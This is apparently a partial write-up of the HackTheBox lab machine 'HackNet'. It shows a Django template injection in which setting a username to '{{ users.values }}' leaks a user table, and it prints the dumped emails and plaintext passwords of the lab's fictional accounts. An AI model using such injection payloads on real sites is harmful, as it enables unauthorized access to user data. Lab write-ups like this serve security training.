# HackNet - HackTheBox

Difficulty: Medium

## Recon

- Ports open: 22,80
- Webapp using django running on port 80

Now this app is actually vulnerable to DTL injection (DTL = Django Templating Language and this can't do the same stuff you do with SSTI like in Jinja2/Flask, so no RCE). So what you do (in short) is to change your username to `{{ users.values }}` and then go and like a post.

Once that's done, you can see your profile in the people who liked it. When you see the link to your image, it will contain the query set to your DTL expression.

<!-- I am not sure how we're supposed to figure this out without source code. So I writeup spammed this one I used this one https://medium.com/@eh-amish/htb-hacknet-walkthrough-476b60f3f57e -->

That, on converting to JSON (just use chatgpt bruh) gives this:

```json
[
  {
    "id": 2,
    "email": "hexhunter@ciphermail.com",
    "username": "hexhunter",
    "password": "H3xHunt3r!",
    "picture": "2.jpg",
    "about": "A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 6,
    "email": "shadowcaster@darkmail.net",
    "username": "shadowcaster",
    "password": "Sh@d0wC@st!",
    "picture": "6.jpg",
    "about": "Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 7,
    "email": "blackhat_wolf@cypherx.com",
    "username": "blackhat_wolf",
    "password": "Bl@ckW0lfH@ck",
    "picture": "7.png",
    "about": "A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 9,
    "email": "glitch@cypherx.com",
    "username": "glitch",
    "password": "Gl1tchH@ckz",
    "picture": "9.png",
    "about": "Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 12,
    "email": "codebreaker@ciphermail.com",
    "username": "codebreaker",
    "password": "C0d3Br3@k!",
    "picture": "12.png",
    "about": "A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": false,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 16,
    "email": "shadowmancer@cypherx.com",
    "username": "shadowmancer",
    "password": "Sh@d0wM@ncer",
    "picture": "16.png",
    "about": "A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 21,
    "email": "whitehat@darkmail.net",
    "username": "whitehat",
    "password": "Wh!t3H@t2024",
    "picture": "21.jpg",
    "about": "An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 24,
    "email": "brute_force@ciphermail.com",
    "username": "brute_force",
    "password": "BrUt3F0rc3#",
    "picture": "24.jpg",
    "about": "Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 25,
    "email": "shadowwalker@hushmail.com",
    "username": "shadowwalker",
    "password": "Sh@dowW@lk2024",
    "picture": "25.jpg",
    "about": "A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": false,
    "is_hidden": false,
    "two_fa": false
  },
  {
    "id": 27,
    "email": "test@test.com",
    "username": "{{ users.values }}",
    "password": "test",
    "picture": "profile.png",
    "about": "",
    "contact_requests": 0,
    "unread_messages": 0,
    "is_public": true,
    "is_hidden": true,
    "two_fa": false
  }
]
```


